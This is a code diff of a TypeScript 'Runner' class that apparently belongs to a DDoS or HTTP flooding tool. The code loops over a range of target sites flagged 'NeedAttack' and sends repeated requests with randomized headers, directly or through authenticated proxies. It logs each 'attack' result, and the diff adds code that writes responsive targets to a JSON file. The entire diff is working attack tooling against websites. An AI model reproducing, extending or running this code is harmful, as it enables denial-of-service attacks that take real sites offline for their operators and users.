@@ -15,8 +15,10 @@ export class Runner {
   private active = false
   public readonly eventSource: EventEmitter
   private requestTimeout: number = 10000
-  private startPair: number 
-  private endPair: number 
+  private startPair: number
+  private endPair: number
+
+  active_targets: TargetDataAlternative[] = []
 
   constructor(props: { targets: TargetDataAlternative[]; onlyProxy: boolean, startID: number, endID: number }) {
     this.onlyProxy = props.onlyProxy
@@ -86,86 +88,90 @@ export class Runner {
     let directRequest = false
     let size = this.endPair - this.startPair;
     let i = this.startPair + Math.floor(Math.random() * size);
-    if (i>=this.targets.length){
+    if (i >= this.targets.length) {
       console.debug(`WRONG VALUE ${i}..${this.targets.length}`)
     }
-    if (!this.onlyProxy) {
+    for (let i = this.startPair; i < this.endPair; i++) {
+      if (!this.onlyProxy) {
 
-      try {
-        const response = await axios.get(this.targets[i].site.page, {
-          timeout: this.requestTimeout,
-          headers: HttpHeadersUtils.generateRequestHeaders()
-        })
-        directRequest = response.status === 200
-      } catch (e) {
-        console.debug("DIRECT probing err ", (e as Error).message)
-        this.eventSource.emit('error', { error: e })
-        directRequest = false
-      }
-
-    }
-    if (this.targets[i].NeedAttack) {
-      let proxy = null
-      try {
-        if (directRequest) {
-          if (this.onlyProxy) {
-            console.log("Changing to only proxy")
-          }
-          const r = await axios.get(this.targets[i].site.page, {
+        try {
+          const response = await axios.get(this.targets[i].site.page, {
             timeout: this.requestTimeout,
-            headers: HttpHeadersUtils.generateRequestHeaders(),
-            validateStatus: () => true
+            headers: HttpHeadersUtils.generateRequestHeaders()
           })
-          this.eventSource.emit('attack', { url: this.targets[i].site.page, log: `${this.targets[i].site.page} | DIRECT | ${r.status}` })
-        } else {
-          if (proxy === null) {
-            proxy = this.targets[i].proxy
-          }
-          let proxyObj: any = {}
-          const proxyAddressSplit = proxy.ip.split(':')
-          const proxyIP = proxyAddressSplit[0]
-          const proxyPort = parseInt(proxyAddressSplit[1])
-          proxyObj.host = proxyIP
-          proxyObj.port = proxyPort
-
-          if (proxy.auth) {
-            const proxyAuthSplit = proxy.auth.split(':')
-            const proxyUsername = proxyAuthSplit[0]
-            const proxyPassword = proxyAuthSplit[1]
-            proxyObj.auth = { username: proxyUsername, password: proxyPassword }
-
-          }
-
-
-          const r = await axios.get(this.targets[i].site.page, {
-            timeout: this.requestTimeout,
-            headers: HttpHeadersUtils.generateRequestHeaders(),
-            validateStatus: () => true,
-            proxy: proxyObj
-          })
-
-          this.eventSource.emit('attack', { url: this.targets[i].site.page, log: `${this.targets[i].site.page} | PROXY | ${r.status}` })
-
-          if (r.status === 407) {
-            console.log(proxy)
-            proxy = null
-          }
-        }
-      } catch (e) {
-        proxy = null
-        const code = (e as AxiosError).code || 'UNKNOWN'
-        if (code === 'UNKNOWN') {
-          this.targets[i].NeedAttack = false
-          console.error(e)
+          directRequest = response.status === 200
+        } catch (e) {
+          console.debug("DIRECT probing err ", (e as Error).message)
+          this.eventSource.emit('error', { error: e })
+          directRequest = false
         }
 
-        this.eventSource.emit('attack', { type: 'atack', url: this.targets[i].site.page, log: `${this.targets[i].site.page} | ${code}` })
-        if (code === 'ECONNABORTED') {
-          this.targets[i].NeedAttack = false
+      }
+      if (this.targets[i].NeedAttack) {
+        let proxy = null
+        try {
+          if (directRequest) {
+            if (this.onlyProxy) {
+              console.log("Changing to only proxy")
+            }
+            const r = await axios.get(this.targets[i].site.page, {
+              timeout: this.requestTimeout,
+              headers: HttpHeadersUtils.generateRequestHeaders(),
+              validateStatus: () => true
+            })
+            this.eventSource.emit('attack', { url: this.targets[i].site.page, log: `${this.targets[i].site.page} | DIRECT | ${r.status}` })
+          } else {
+            if (proxy === null) {
+              proxy = this.targets[i].proxy
+            }
+            let proxyObj: any = {}
+            const proxyAddressSplit = proxy.ip.split(':')
+            const proxyIP = proxyAddressSplit[0]
+            const proxyPort = parseInt(proxyAddressSplit[1])
+            proxyObj.host = proxyIP
+            proxyObj.port = proxyPort
+
+            if (proxy.auth) {
+              const proxyAuthSplit = proxy.auth.split(':')
+              const proxyUsername = proxyAuthSplit[0]
+              const proxyPassword = proxyAuthSplit[1]
+              proxyObj.auth = { username: proxyUsername, password: proxyPassword }
+
+            }
+
+
+            const r = await axios.get(this.targets[i].site.page, {
+              timeout: this.requestTimeout,
+              headers: HttpHeadersUtils.generateRequestHeaders(),
+              validateStatus: () => true,
+              proxy: proxyObj
+            })
+
+            this.eventSource.emit('attack', { url: this.targets[i].site.page, log: `${this.targets[i].site.page} | PROXY | ${r.status}` })
+            //this.active_targets.push(this.targets[i]);
+            const fs = require('fs');
+            let data = JSON.stringify(this.targets[i]);
+            fs.appendFileSync('active_targets.json', `\n${data}`);
+            if (r.status === 407) {
+              console.log(proxy)
+              proxy = null
+            }
+          }
+        } catch (e) {
+          proxy = null
+          const code = (e as AxiosError).code || 'UNKNOWN'
+          if (code === 'UNKNOWN') {
+            this.targets[i].NeedAttack = false
+            console.error(e)
+          }
+
+          this.eventSource.emit('attack', { type: 'atack', url: this.targets[i].site.page, log: `${this.targets[i].site.page} | ${code}` })
+          if (code === 'ECONNABORTED') {
+            this.targets[i].NeedAttack = false
+          }
         }
       }
     }
-
   }
 
   /*private async sendTroops() {
